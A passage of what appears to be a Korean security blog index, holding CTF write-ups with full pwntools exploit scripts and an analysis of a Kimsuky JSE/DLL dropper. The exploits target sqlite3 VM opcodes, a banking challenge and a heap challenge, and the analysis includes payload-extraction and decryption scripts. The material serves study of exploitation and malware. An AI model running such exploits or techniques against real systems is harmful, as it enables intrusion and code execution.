0x36b8 # sqlite3_context payload = b\u0026#39;\u0026#39; # scopy 0x18 payload += p64(mem_start + 0x0) # Mem * pOut \u0026lt;- Mem[0] address, p3 must be 0 payload += p64(payload_start+0x38) # FuncDef *pFunc payload += p64(payload_start + 0x18) # /bin/sh payload += b\u0026#39;/bin/sh\\x00\u0026#39; payload += p32(0) * 2 payload += p8(0) * 2 payload += p8(1) + p8(0) * 5 # argc = 1 payload += p64(0) # argv * # FuncDef payload += p64(0) *3 payload += p64(libc_base + 0x000000000009097f) payload += b\u0026#39;\\x00\u0026#39; * (0x360 - len(payload)) payload += p64(libc_base + libc.sym.system-0x46e) # do_system + 2 # 0x000000000009097f : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x360] hexp = \u0026#39;\u0026#39; for i in payload: hexp += hex(i)[2:].rjust(2,\u0026#39;0\u0026#39;) prepare(2, f\u0026#34;SELECT x\u0026#39;{hexp}\u0026#39;\u0026#34;.encode()) payload = compile(OP_Init, 0, pc) # jmp to pc payload += compile(OP_PureFunc, p4 = payload_start, p3 = 0) payload += compile(OP_Halt) modify_opcode(1, payload) pause() exec_q(1) p.interactive() Serious-banking 대회 기간에 풀었던 문제이다.\nAnalysis #include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;thread\u0026gt; #include \u0026lt;cstdio\u0026gt; struct Account { char id; bool active; char* name; uint64_t balance; }; void submit_support_ticket(char* _name, char* _content) { // stub } char* separator; char* debug_log; Account* accounts; char id_counter = 0; size_t account_count = 0; void interface() { while(true) { printf(\u0026#34;Welcome to the ShakyVault Bank Interface\\n\u0026#34;); printf(separator); printf(\u0026#34;1) Create new Account\\n\u0026#34;); printf(\u0026#34;2) Show an Account\\n\u0026#34;); printf(\u0026#34;3) Create a Transaction\\n\u0026#34;); printf(\u0026#34;4) Deactivate an Account\\n\u0026#34;); printf(\u0026#34;5) Create a support ticket\\n\u0026#34;); printf(\u0026#34;6) Exit\\n\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); const int selection = fgetc(stdin) - static_cast\u0026lt;int\u0026gt;(\u0026#39;0\u0026#39;); fgetc(stdin); switch (selection) { case 1: { if (account_count \u0026gt;= 255) { printf(\u0026#34;We\u0026#39;ve unfortunately run out of accounts. Please try again later.\u0026#34;); break; } printf(\u0026#34;Account Name: \u0026#34;); char* account_name = new char[80]; std::cin.getline(account_name, 80); for (size_t i = 0; i \u0026lt; 80; i++) { if (account_name[i] == \u0026#39;\\n\u0026#39;) { account_name[i] = \u0026#39;\\0\u0026#39;; break; } } account_name[79] = \u0026#39;\\0\u0026#39;; accounts[account_count].id = id_counter++; accounts[account_count].active = true; accounts[account_count].name = account_name; accounts[account_count].balance = 35; printf(\u0026#34;Account created. Your id is %d\\n\u0026#34;, accounts[account_count++].id); printf(\u0026#34;We have granted you a $35 starting bonus.\\n\u0026#34;); break; } case 2: { printf(\u0026#34;Which id do you want to read? \u0026#34;); size_t number; std::cin \u0026gt;\u0026gt; number; if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } fgetc(stdin); if (number \u0026gt;= account_count) { printf(\u0026#34;That account does not exist.\u0026#34;); break; } const Account acc = accounts[number]; printf(\u0026#34;Id: %d\\n\u0026#34;, acc.id); printf(\u0026#34;Name: %s\\n\u0026#34;, acc.name); printf(\u0026#34;Active: %s\\n\u0026#34;, acc.active ? \u0026#34;true\u0026#34; : \u0026#34;false\u0026#34;); printf(\u0026#34;Balance: %lu\\n\u0026#34;, acc.balance); break; } case 3: { printf(\u0026#34;Which account do you want to transfer from? \u0026#34;); size_t id_from; std::cin \u0026gt;\u0026gt; id_from; if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } fgetc(stdin); printf(\u0026#34;Which account do you want to transfer to? \u0026#34;); size_t id_to; std::cin \u0026gt;\u0026gt; id_to; if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } fgetc(stdin); if (id_from \u0026gt;= account_count || id_to \u0026gt;= account_count) { printf(\u0026#34;Invalid account id\\n\u0026#34;); break; } printf(\u0026#34;How much money do you want to transfer? \u0026#34;); uint64_t amount; std::cin \u0026gt;\u0026gt; amount; if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } fgetc(stdin); const Account from = accounts[id_from]; const Account to = accounts[id_to]; if (from.balance \u0026lt; amount) { printf(\u0026#34;You don\u0026#39;t have enough money for that.\u0026#34;); break; } if (!from.active || !to.active) { printf(\u0026#34;That account is not active.\u0026#34;); break; } accounts[from.id].balance -= amount; accounts[to.id].balance += amount; printf(\u0026#34;Transaction created!\\n\u0026#34;); break; } case 4: { printf(\u0026#34;Which account do you want to disable? \u0026#34;); size_t number; std::cin \u0026gt;\u0026gt; number; if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } fgetc(stdin); if (number \u0026gt;= account_count) { printf(\u0026#34;That account does not exist.\u0026#34;); break; } accounts[number].active = false; } case 5: { printf(\u0026#34;Which account does this issue concern? \u0026#34;); size_t number; std::cin \u0026gt;\u0026gt; number; if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } fgetc(stdin); Account acc = accounts[number]; char name[40] = \u0026#34;Support ticket from \u0026#34;; char* content = new char[1000]; printf(\u0026#34;Please describe your issue (1000 charaters): \u0026#34;); std::cin.getline(content, 1000); if (std::cin.fail()) { printf(\u0026#34;Invalid Input.\u0026#34;); exit(EXIT_FAILURE); } char* name_ptr = name + strlen(name); strcpy(name_ptr, acc.name); name_ptr += strlen(acc.name); *name_ptr = \u0026#39;\\0\u0026#39;; submit_support_ticket(name, content); printf(\u0026#34;Thanks! Our support technicians will help you shortly.\\n\u0026#34;); delete[] content; break; } case 6: { return; } default: { printf(\u0026#34;Invalid option %d\\n\\n\\n\u0026#34;, selection); break; } } } } int main() { setbuf(stdout, nullptr); separator = new char[128]; debug_log = new char[2900]; accounts = new Account[256]; strcpy(debug_log, \u0026#34;TODO\u0026#34;); for (int i = 0; i \u0026lt; 126; i++) separator[i] = \u0026#39;_\u0026#39;; separator[126] = \u0026#39;\\n\u0026#39;; separator[127] = \u0026#39;\\0\u0026#39;; interface(); delete[] separator; delete[] debug_log; delete[] accounts; return 0; } Exploit Create Transaction이 실행될때 두번의 참조가 일어나게 된다. id는 char이므로 sign extension이 일어나서 oob write가 가능하다.\naccounts[from.id].balance -= amount; accounts[to.id].balance += amount; 그리고 아래에서 stack bof가 터진다.\nchar* name_ptr = name + strlen(name); strcpy(name_ptr, acc.name); name_ptr += strlen(acc.name); *name_ptr = \u0026#39;\\0\u0026#39;; Exploit script from pwn import * from tqdm import tqdm sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) # p = process(\u0026#39;./vuln\u0026#39;) p = remote(\u0026#39;serious-banking.chal.irisc.tf\u0026#39;,10001) # p = remote(\u0026#39;localhost\u0026#39;,1024) # libc = ELF(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) libc = ELF(\u0026#39;./bc.so.6\u0026#39;) # context.log_level=\u0026#39;debug\u0026#39; for i in tqdm(range(134)): sla(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Name\u0026#39;,b\u0026#39;A\u0026#39;*(0x4c-8-1)) def transfer(fr,to,amount): assert amount \u0026gt;0 sla(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;3\u0026#39;) sla(b\u0026#39;from\u0026#39;,str(fr)) sla(b\u0026#39;to\u0026#39;,str(to)) sla(b\u0026#39;transfer? \u0026#39;,str(amount)) for i in tqdm(range(0x34)): transfer(128,0,35) transfer(128,0,30) for i in tqdm(range(0x34)): transfer(129,0,35) transfer(129,0,30) for i in tqdm(range(123)): transfer(i,130,35) context.log_level=\u0026#39;debug\u0026#39; transfer(130,0,11) # 0x5f5f5f -\u0026gt; 0x7025 -\u0026gt; %p p.recvuntil(b\u0026#39;0x\u0026#39;) libc_base = int(b\u0026#39;0x\u0026#39;+p.recvuntil(b\u0026#39;_\u0026#39;)[:-1],16) - libc.sym.write -20 success(hex(libc_base)) context.log_level=\u0026#39;debug\u0026#39; sla(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;1\u0026#39;) # 0xe5306 , 0x4497f , 0x449d3 payload = b\u0026#39;A\u0026#39;*(0x44)+p64(libc_base+0xe5306) print(payload) sla(b\u0026#39;Name\u0026#39;,payload) sla(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;5\u0026#39;) sla(b\u0026#39;? \u0026#39;,b\u0026#39;134\u0026#39;) sla(b\u0026#39;: \u0026#39;,b\u0026#39;asdf\u0026#39;) sla(b\u0026#39;\u0026gt;\u0026#39;,b\u0026#39;6\u0026#39;) # OoB Add/Sub # Stack Bof # OoB copy # Heap OoB Add/Sub p.interactive() ","permalink":"https://msh1307.kr/blog/iris_ctf_2024/","summary":"DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.\nsequilitis SQL query를 만들고 실행시키는 프로그램이다.\nAnalysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.\nsqlite3 sqlite3의 vmcode들을 분석해야한다.\n/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement.","title":"Iris CTF 2024"},{"content":"ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp+1Ch] [rbp-14h] int idx; // [rsp+20h] [rbp-10h] unsigned int v7; // [rsp+24h] [rbp-Ch] eq_obj *obj; // [rsp+28h] [rbp-8h] printf(\u0026#34;idx: \u0026#34;); idx = read_int(); if ( (unsigned int)idx \u0026lt; 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i \u0026lt;= 63; ++i ) { res = calc(obj, i - 0x20); v7 = res + 0x20; LODWORD(v1) = printf(\u0026#34;(%d, %d)\\n\u0026#34;, (unsigned int)(i - 0x20), res); if ( v7 \u0026lt;= 0x3F ) { if ( flag ) v3 = \u0026#39;.\u0026#39;; else v3 = \u0026#39;@\u0026#39;; v1 = (uint64_t *)\u0026amp;buf[0x40 * (__int64)(int)v7 + i]; *(_BYTE *)v1 = v3; } } } else { LODWORD(v1) = puts(\u0026#34;index out of bounds\u0026#34;); } return (int)v1; } void sub_15F4() { unsigned int v0; // [rsp+Ch] [rbp-4h] printf(\u0026#34;idx: \u0026#34;); v0 = read_int(); if ( v0 \u0026lt; 0x80 ) free(obj_list_[v0]); else puts(\u0026#34;index out of bounds\u0026#34;); } double free가 발생한다.\n__int64 __fastcall calc(eq_obj *obj, int a2) { unsigned int v3; // [rsp+Ch] [rbp-10h] signed int term_iter; // [rsp+10h] [rbp-Ch] int v5; // [rsp+14h] [rbp-8h] signed int i; // [rsp+18h] [rbp-4h] v3 = 0; for ( term_iter = 0; term_iter \u0026lt; (signed int)obj-\u0026gt;degree; ++term_iter ) { v5 = 1; for ( i = 0; i \u0026lt; term_iter; ++i ) v5 *= a2; v3 += v5 * obj-\u0026gt;term_list[term_iter]; } return v3; } // 1x + (cx) + (c^2*x1) + (c^3*x) // 1x + -(cx) + (c^2*x1) + -(c^3*x) 다항식을 입력받는다.\n주석에 달린것 처럼 연산이 된다.\nExploitation DFB가 발생한다는 것은, dangling pointer가 남는다는 의미다. dangling pointer가 남았다면 free된 상태에서 연산이 가능하다는 의미다. free된 상태에서의 힙주소를 leak할 수 있게 된다.\n1*x + c*x1 + c^2*x2 + c^3*x3 1*x + -c*x1 + c^2*x2 + -c^3*x3 x,x1=0,0 c^2*x2 + c^3*x3 c^2*x2 + -c^3*x3 기본적으로 free 이후 tcache에서의 메모리 힙 청크 상태를 확인해보면, x, x1자리가 0이다. 그래서 -1, +1일때의 출력 결과를 바탕으로 주소를 얻어낼 수 있다.\nDFB를 통해 임의 청크를 할당해서 size를 변조하고 free한다. unsorted bin에 위치시키고 main arena가 libc에 위치하고 있으니 이와 doubly linked list로 연결된 unsorted bin을 leak한다.\n구글의 nsjail을 이용해서 docker가 배포되었다. /srv에 우분투가 마운트되고 격리된 프로세스는 /srv를 /로 마운트하는것을 확인했다. 이를 이용해 환경을 구축할 수 있었다. https://github.com/msh1307/binPatch 옛날에 개발했던 바이너리 패치 도구를 이용해서 환경을 맞춘다.\nExploit script from pwn import * from regex import W # nsjail mounts /srv/ -\u0026gt; / # ubuntu@sha256:f2034e7195f61334e6caff6ecf2e965f92d11e888309065da85ff50c617732b8 sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) def mk_eq(degree, i : list): sla(b\u0026#39;pp: \u0026#39;, str(1)) sla(b\u0026#39;degree: \u0026#39;,str(degree)) for iter in range(degree): sla(b\u0026#39;enter\u0026#39;, str(i[iter])) def free(idx): sla(b\u0026#39;pp: \u0026#39;, str(5)) sla(b\u0026#39;idx: \u0026#39;, str(idx)) def print_(): sla(b\u0026#39;pp: \u0026#39;, str(2)) def arith(idx): sla(b\u0026#39;pp: \u0026#39;, str(3)) sla(b\u0026#39;idx: \u0026#39;, str(idx)) libc = ELF(\u0026#39;./bc.so.6\u0026#39;) p = process(\u0026#39;./out.bin\u0026#39;) # already patched for i in range(0x9): mk_eq(10, [26739]*10) for i in range(0x9): free(i) for i in range(0x7): mk_eq(10, [26739]*10) mk_eq(0x4, [26739]*4) free(7) # idx 8 -\u0026gt; 4 | idx7 arith(8) rvu(b\u0026#39;(-1, \u0026#39;) neg_cx = int(rvu(b\u0026#39;)\u0026#39;)[:-1]) rvu(b\u0026#39;(1, \u0026#39;) pos_cx = int(rvu(b\u0026#39;)\u0026#39;)[:-1]) v = (((neg_cx + pos_cx))//2) heap = ( (((pos_cx - v)) \u0026lt;\u0026lt; 32) | v\u0026amp;0xffffffff ) success(hex(heap)) mk_eq(2,[0]*2) # idx 17 for i in range(9): mk_eq(10,[0]*10) for i in range(9): free(i+18) free(7+18) for i in range(3): mk_eq(0,[]) target = heap + 0x280 mk_eq(4,[target\u0026amp;0xffffffff,target\u0026gt;\u0026gt;32,0,0]) mk_eq(8,[0]*8) mk_eq(4,[0,0,0x461,0]) # +0x460, there\u0026#39;s a prev inusebit enabled sz. free(0) # just reclaiming a freed chunk and changing a content ptr let me leak libc. mk_eq(10,[0]*10) # 33 mk_eq(10,[0]*10) # 34 free(33) free(34) target = heap + 0x338 mk_eq(4,[4,0,target,target\u0026gt;\u0026gt;32]) \u0026#39;\u0026#39;\u0026#39; gef\u0026gt; x/4xg 0x55db06567330+8 0x55db06567338: 0x00000000000003c1 0x00007fe33e2c6be0 0x55db06567348: 0x00007fe33e2c6be0 0x0000000000000000\u0026#39;\u0026#39;\u0026#39; arith(33) rvu(b\u0026#39;(-1, \u0026#39;) neg_cx = int(rvu(b\u0026#39;)\u0026#39;)[:-1]) rvu(b\u0026#39;(1, \u0026#39;) pos_cx = int(rvu(b\u0026#39;)\u0026#39;)[:-1]) v = (((neg_cx + pos_cx))//2) libc_base = ( (((pos_cx - v)) \u0026lt;\u0026lt; 32) | v\u0026amp;0xffffffff ) - 0x1ecbe0 success(hex(libc_base)) mk_eq(10,[0]*10) mk_eq(10,[0]*10) free(36) free(37) mk_eq(4,[26739]*4) for i in range(9): mk_eq(10,[0]*10) for i in range(9): free(i+38) free(7+38) for i in range(3): mk_eq(0,[]) target = libc_base + libc.sym.__free_hook mk_eq(4,[target\u0026amp;0xffffffff,target\u0026gt;\u0026gt;32,0,0]) mk_eq(8,[0]*8) mk_eq(4,[(libc_base+libc.sym.system)\u0026amp;0xffffffff,(libc_base+libc.sym.system)\u0026gt;\u0026gt;32,0,0]) # +0x460, there\u0026#39;s a prev inuse bit enabled sz. free(36) p.interactive() ","permalink":"https://msh1307.kr/blog/lactf_2024_ppplot/","summary":"ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp+1Ch] [rbp-14h] int idx; // [rsp+20h] [rbp-10h] unsigned int v7; // [rsp+24h] [rbp-Ch] eq_obj *obj; // [rsp+28h] [rbp-8h] printf(\u0026#34;idx: \u0026#34;); idx = read_int(); if ( (unsigned int)idx \u0026lt; 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i \u0026lt;= 63; ++i ) { res = calc(obj, i - 0x20); v7 = res + 0x20; LODWORD(v1) = printf(\u0026#34;(%d, %d)\\n\u0026#34;, (unsigned int)(i - 0x20), res); if ( v7 \u0026lt;= 0x3F ) { if ( flag ) v3 = \u0026#39;.","title":"LACTF 2024 - ppplot"},{"content":"Overview 북한 Kimsuky 위협 그룹에서 외교부를 타겟으로 악성코드를 유포했다.\nAnalysis Procmon 외교부가판2021-05-07로 유포되었고, .pdf.jse의 형태를 취하고 있었다. vm안에서 실행하고 process create로 필터링해서 확인해보면, WScript.exe가 돌면서 프로세스를 생성한다.\ndll를 regsvr32.exe로 등록한다. 그냥 pdf viewer처럼 동작하면서 외교부가판 문서를 열어준다. 하지만 procmon으로 확인해보면 process create를 걸고 확인해보면 실제로는 WScript가 실행되면서 실제 악성코드를 드랍한다. regsvr32.exe로 악성 dll을 로드하고 실행 흐름이 넘어간다. 이러한 형태는 백신을 우회하기 위해 사용된다.\nDll Extraction pdf를 열어주고 뒤에선 base64 더블 디코딩을 수행하고 실행흐름을 dll로 프록시한다.\nwith open(\u0026#39;./1.jse\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x2000000) st = buf[(buf.find(b\u0026#39;d6rdVIu1CNC = \u0026#34;\u0026#39;)):] st = (st[st.find(b\u0026#39;\u0026#34;\u0026#39;)+1:]) dropped = st[:st.find(b\u0026#39;\u0026#34;\u0026#39;)] with open(\u0026#39;./dropped_base\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dropped) with open(\u0026#39;./dropped_base\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x20000000) import base64 dec = (base64.decodebytes(buf)) with open(\u0026#39;./dropped\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dec) # dropped pdf with open(\u0026#39;./1.jse\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x2000000) st = buf[(buf.find(b\u0026#39;tbPaitkT4N4 =\u0026#39;)):] st = (st[st.find(b\u0026#39;\u0026#34;\u0026#39;)+1:]) dropped = st[:st.find(b\u0026#39;\u0026#34;\u0026#39;)] with open(\u0026#39;./dropped_dll_base\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dropped) with open(\u0026#39;./dropped_dll_base\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x200000000) dec = base64.decodebytes((base64.decodebytes(buf))) with open(\u0026#39;./dropped_dll.dll\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dec) # dropped pdf 분석한대로 추출하면 악성 dll과 pdf를 얻을 수 있다.\nReverse engineering regsvr32.exe 처음에 실행흐름을 프록시하기 위해서 regsvr32.exe를 호출했다. 악성 dll 분석 이전에 regsvr32.exe에서 어떤 함수를 호출하는지 확인했다. DllRegisterServer 문자열을을 로드한다.\n메인 부분이다. 실질적으로 DllRegisterServer를 호출한다.\ndropped_dll.dll 분석하다보면 다음과 같은 패턴이 보인다.\nobj[2] = 0i64; obj[3] = 7i64; LOWORD(obj[0]) = 0; sub_7FFF20E781A0(obj, L\u0026#34;651a77c90efb857ab62008a5a730e362365c52c9a23ec8c4001329a13434e5b6e3cc8b774885327ffaef\u0026#34;, 84ui64); v1 = sub_7FFF20E8B330(obj, v30); sub_7FFF20E781A0는 문자열을 할당한다. 실질적으로 실행되는 로직은 아래와 같다. 최종적으로 다음과 같은 구조를 가지게된다. 넘겨지는 size 별로 처리가 다르다. size가 7 이하라면, a[0], a[1] 영역에 바로 문자열을 쓴다. 더 크다면 아래와 같은 구조로 할당한다.\na[0] = str_mem ... a[2] = sz 이후 sub_7FFF20E8B330을 호출한다.\n실질적으로 여기서 디코딩을 수행한다. 처음에 0x10개의 wchar_t를 읽고 rot_hex에 저장한다. 문자열 size가 8 이상이면, *obj를 문자열로 참조한다. 루프를 돌면서 hex_rot[iterator%0x10]^ *obj[iter_] ^ dec_16을 한다. dec_16은 전에 참조한 hex가 들어간다.\nloader.cpp #include \u0026lt;iostream\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;cstdint\u0026gt; #include \u0026lt;stdio.h\u0026gt; void hexdump(void *ptr, int buflen) { unsigned char *buf = (unsigned char*)ptr; int i, j; for (i=0; i\u0026lt;buflen; i+=16) { printf(\u0026#34;%06x: \u0026#34;, i); for (j=0; j\u0026lt;16; j++) if (i+j \u0026lt; buflen) printf(\u0026#34;%02x \u0026#34;, buf[i+j]); else printf(\u0026#34; \u0026#34;); printf(\u0026#34; \u0026#34;); for (j=0; j\u0026lt;16; j++) if (i+j \u0026lt; buflen) printf(\u0026#34;%c\u0026#34;, isprint(buf[i+j]) ? buf[i+j] : \u0026#39;.\u0026#39;); printf(\u0026#34;\\n\u0026#34;); } } int main() { const char* libraryPath = \u0026#34;.\\\\dropped_dll.dll\u0026#34;; HINSTANCE hDLL = LoadLibraryA(libraryPath); if (hDLL == NULL) { DWORD error = GetLastError(); std::cerr \u0026lt;\u0026lt; \u0026#34;failed to load dll. Error code: \u0026#34; \u0026lt;\u0026lt; error \u0026lt;\u0026lt; std::endl; return 1; } const char* functionName = \u0026#34;DllRegisterServer\u0026#34;; typedef int64_t * (*f_type)(int64_t * a, int64_t * b); typedef int64_t * (*f_type1)(int64_t * a, wchar_t * src, int64_t sz); uint64_t v = reinterpret_cast\u0026lt;uint64_t\u0026gt;(GetProcAddress(hDLL, functionName)); if (v == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;failed to get the function.\u0026#34; \u0026lt;\u0026lt; std::endl; FreeLibrary(hDLL); return 1; } uint64_t t = v - (0x7FFBE99D8CA0-0x7FFBE99CB330); uint64_t t1 = v - (0x7FFBE99D8CA0-0x07FFBE99B81A0); std::cout \u0026lt;\u0026lt; \u0026#34;DllRegisterServer addr: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; v \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;enc addr: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; t \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;prep addr: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; t1 \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; std::endl; f_type dec = reinterpret_cast\u0026lt;f_type\u0026gt;(t); f_type1 prep = reinterpret_cast\u0026lt;f_type1\u0026gt;(t1); int64_t a[4]; a[1] = 0; a[2] = 0; a[3] = 7; int64_t * ret = prep(a,L\u0026#34;651a77c90efb857ab62008a5a730e362365c52c9a23ec8c4001329a13434e5b6e3cc8b774885327ffaef\u0026#34;, 84); std::cout \u0026lt;\u0026lt; \u0026#34;ret[0] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[0] \u0026lt;\u0026lt; \u0026#34; -\u0026gt; \u0026#34;; std::wcout \u0026lt;\u0026lt; (wchar_t *)ret[0] \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;ret[1] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[1] \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;ret[2] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[2] \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;ret[3] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[3] \u0026lt;\u0026lt; std::endl; int64_t b[4]; int x; std::cin \u0026gt;\u0026gt; x; int64_t * ret1 = dec(a,b); std::wcout \u0026lt;\u0026lt; (wchar_t *)ret1[0] \u0026lt;\u0026lt; std::endl; FreeLibrary(hDLL); return 0; } 분석할때 문자열 decryption을 쉽게하려고 위와 같은 dll로더를 작성했다. 근데 생각보다 저런 패턴의 hex 문자열들이 너무 많아서 하나씩 돌리기엔 무리인것 같아서 idapython을 작성했다.\ndecrypt.py def dec(v): rot_hex = [] out = \u0026#39;\u0026#39; for i in range(16): rot_hex.append(int(v[i*2:i*2+2],16)) x = 0 for i in range((len(v)-32)//2): hex_ = int(v[i*2+0x20: i*2+0x22],16) res = rot_hex[i%0x10] ^ x ^ hex_ out += chr(res) x = hex_ return out def is_hex(v): f = 1 for i in range(len(v)): if v[i] not in \u0026#39;0123456789abcdef\u0026#39;: f = 0 break return f from idautils import * import idaapi, ida_ua, idc def comment(ea,comment): cfunc = idaapi.decompile(ea) tl = idaapi.treeloc_t() tl.ea = ea tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, comment) cfunc.save_user_cmts() target = 0x07FFF20E781A0 for xref in XrefsTo(target, 0): args = idaapi.get_arg_addrs(xref.frm) if args: insn = ida_ua.insn_t() ida_ua.decode_insn(insn, args[1]) if insn.itype == 0x5c: wstr = idc.get_operand_value(insn.ea,1) t = idc.get_operand_type(insn.ea,1) if t == 2: sz = idc.get_operand_value(args[2],1) if sz == 0 or idc.get_operand_type(args[2],1) == 1: # r8d == 0 continue if sz \u0026gt; 0x20 and sz \u0026amp; 1 == 0: continue v = ida_bytes.get_bytes(wstr, sz*2) estr = \u0026#39;\u0026#39; for i in range(sz): estr += chr(v[2*i]) if is_hex(estr): comment(xref.frm, dec(estr)) print(\u0026#34;done\u0026#34;) 적용시키면 다음과 같이 주석으로 decrypt시 string을 보여준다. Behavior 대부분의 중요한 API들은 string decryption이후 런타임에 동적으로 호출된다 ESTCommon.dll을 준비하고, 문자열을 연결한다. 이후 data에 이 스트링을 넣는다.\n레지스트리키를 등록한다. 이렇게 등록해놓고나서 KeyboardMonitor, ScreenMonitor, FolderMonitor, UsbMonitor 플래그를 쓴다. 특정 파일에 a로 쓰는것을 확인할 수 있다.\n뮤텍스를 생성해서 중복 실행을 방지한다. 마지막으로 여러 쓰레드를 생성한다.\nInput Capture log.txt에 저장하는것으로 보인다. v2를 0~255까지 순회시키면서 입력을 캡쳐한다.\nScreen Capture 계속 루프를 돈다. capture 함수에서 캡쳐하고 비트맵으로 저장한다. Collect media files Desktop, Downloads, Documents, INetCache\\IE 같은곳을 돈다. 파일을 찾아서 저장한다.\nCollect removable media files 이런식으로 A부터 다 돌려보는식으로 체크한다. ","permalink":"https://msh1307.kr/blog/jse_dropper_kimsuky/","summary":"Overview 북한 Kimsuky 위협 그룹에서 외교부를 타겟으로 악성코드를 유포했다.\nAnalysis Procmon 외교부가판2021-05-07로 유포되었고, .pdf.jse의 형태를 취하고 있었다. vm안에서 실행하고 process create로 필터링해서 확인해보면, WScript.exe가 돌면서 프로세스를 생성한다.\ndll를 regsvr32.exe로 등록한다. 그냥 pdf viewer처럼 동작하면서 외교부가판 문서를 열어준다. 하지만 procmon으로 확인해보면 process create를 걸고 확인해보면 실제로는 WScript가 실행되면서 실제 악성코드를 드랍한다. regsvr32.exe로 악성 dll을 로드하고 실행 흐름이 넘어간다. 이러한 형태는 백신을 우회하기 위해 사용된다.\nDll Extraction pdf를 열어주고 뒤에선 base64 더블 디코딩을 수행하고 실행흐름을 dll로 프록시한다.","title":"Kimsuky malware analysis"},{"content":"setup raspi-img \u0026amp; switch 평소에 포트포워딩해서 개인 nas겸 CTF시 request bin 같은걸로 잘 쓰고 있었는데, 본딩을 설정하다가 서버가 죽어버렸다. 라즈베리파이 5도 구매해서 4랑 같이 처음부터 밀고 다시 세팅했다. 기존에 WiFi로만 동작하던 서버를 이더넷이 끊켰을때만 WiFi를 사용하도록 바꿨다. cat.5e 랜선을 연결하고 1Gbps를 지원하는 스위칭 허브를 구매하여 연결했다.\n라즈베리파이 pcie 인터페이스에 WD SN770을 연결했는데 제대로 동작하지 않았다. 중국산 500기가 ssd 연결하니 잘 동작해서 usb3.0으로 연결했다. network interface #!/bin/bash if [ -z \u0026#34;$1\u0026#34; ]; then DELAY=\u0026#34;30\u0026#34; else DELAY=\u0026#34;$1\u0026#34; fi sleep $DELAY EthAddr=$(ip addr show eth0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) WiFiAddr=$(ip addr show wlan0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) if [ -z $EthAddr ]; then echo \u0026#34;Using WiFi\u0026#34; echo \u0026#34;wlan0 IP=$WiFiAddr\u0026#34; else echo \u0026#34;Using Ethernet! Switching off WiFi\u0026#34; echo \u0026#34;eth0 IP=$EthAddr\u0026#34; echo \u0026#34;wlan0 IP=$WiFiAddr\u0026#34; ifconfig wlan0 down fi 이렇게 작성해준다.\n#!/bin/sh -e # # rc.local # # This script is executed at the end of each multiuser runlevel. # Make sure that the script will \u0026#34;exit 0\u0026#34; on success or any other # value on error. # # In order to enable or disable this script just change the execution # bits. # # By default 